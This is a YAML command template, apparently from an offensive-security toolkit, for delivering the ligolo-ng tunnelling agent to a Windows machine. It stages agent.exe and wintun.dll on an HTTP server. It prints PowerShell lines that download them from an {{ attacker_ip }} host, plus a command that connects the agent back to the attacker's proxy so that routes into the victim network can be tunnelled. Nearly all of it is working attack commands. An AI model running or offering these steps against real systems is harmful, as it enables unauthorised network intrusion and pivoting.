metadata:
  filename: "deliver-windows-ligolo-ng-including-setup.yaml"
  tags: ["windows", "proxy"]
  created: "2025-03-29"
  author: "Unknown"

content: |
  mkdir -p packstation/outbound;\
  cp {{ tools_dir }}/ligolo-ng/agent/windows/agent.exe packstation/outbound/;\
  cp {{ tools_dir }}/ligolo-ng/agent/wintun/wintun/bin/amd64/wintun.dll packstation/outbound/;\
  cp {{ tools_dir }}/ligolo-ng/proxy/linux/proxy .;\
  echo '================================================================'; \
  echo '                      -----Kali-----                            '; \
  echo "Start proxy: sudo '$(pwd)/proxy' -selfcert"; \
  echo "Create a new tuntap interface: interface_create --name 'ligolo' "; \
  echo "Show agent interfaces: ifconfig"; \
  echo "Setup the routes: route_add --name ligolo --route <cidr>"; \
  echo "Start the tunnel: tunnel_start --tun ligolo"; \
  echo '================================================================'; \
  echo '                      -----PowerShell-----                      '; \
  echo 'Preperation 2 (Deliver agent.exe): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/agent.exe -Outfile {{ delivery_path_windows }}\agent.exe'; \
  echo 'Preperation 3 (Deliver wintun.dll): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/wintun.dll -Outfile {{ delivery_path_windows }}\wintun.dll'; \
  echo "Connect agent to proxy: {{ delivery_path_windows }}\agent.exe -ignore-cert -connect {{ attacker_ip }}:11601"; \
  echo '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
